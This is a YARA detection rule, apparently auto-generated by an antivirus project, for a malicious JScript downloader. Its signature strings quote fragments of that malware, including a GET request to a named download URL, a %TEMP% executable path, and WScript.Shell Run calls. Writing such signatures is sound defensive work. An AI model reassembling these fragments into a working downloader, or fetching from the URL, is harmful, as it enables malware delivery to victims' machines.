rule sig_20160329_8e4c7ee0aa875079399a72024a9c2e60 {
  meta:
    description = "datamaliciousorder - file 20160329_8e4c7ee0aa875079399a72024a9c2e60.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9e7120175013d36e105329bb09f06fdf6fe31507ea66bdfd1bbe1999be33dc8f"

  strings:
    $s1  = "function Gmfvlgk() {return Cslvnlufg[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"XUA9cZzN4dFL.exe\";};" fullword ascii
    $s2  = "do {WScript[Xmtika](Ybjbipjtum() * 11)} while (Ynrss[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Cslvnlufg = function Avfmwpsvzj() {return WScript[Ctzptzadtu](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Gvzaokc(Bfpzw, Wwpnhths){return Bfpzw - Wwpnhths;};" fullword ascii
    $s5  = "Ynrss[Tgbqt](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s6  = "function Ruenznf(Zzfdkuow){Cslvnlufg[\"Run\"](Zzfdkuow, Cpnjvlmxby, Cpnjvlmxby);};" fullword ascii
    $s7  = "function Fjdtljier() {return ((Jdkndy == true) && (Jdkndy == Yozocvyx)) ? 1 : Cpnjvlmxby;};" fullword ascii
    $s8  = "function Ybjbipjtum(){return 22;};" fullword ascii
    $s9  = "var Yobnsnwdfb = false;" fullword ascii
    $s10 = "function Svpqtinkvk(){return Yxfxgnmh;};" fullword ascii
    $s11 = " while (Hctgl){" fullword ascii
    $s12 = "function Mrtzwlbwvo()" fullword ascii
    $s13 = "function Ucrrvwob(Zunnaiwuj) {var Alncsxzjhp = (1, 2, 3, 4, 5, Zunnaiwuj); return Alncsxzjhp;};" fullword ascii
    $s14 = "function Gkajb(){return Ctzptzadtu;};" fullword ascii
    $s15 = "var Wxswoyxdx = new this[\"Date\"]();" fullword ascii
    $s16 = "Jdkndy = true; " fullword ascii
    $s17 = "var Jdkndy = false;" fullword ascii
    $s18 = "var Yozocvyx = false;" fullword ascii
    $s19 = "Yozocvyx = true; " fullword ascii
    $s20 = "return Gvzaokc(Brbnhqiy, Effksevy);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}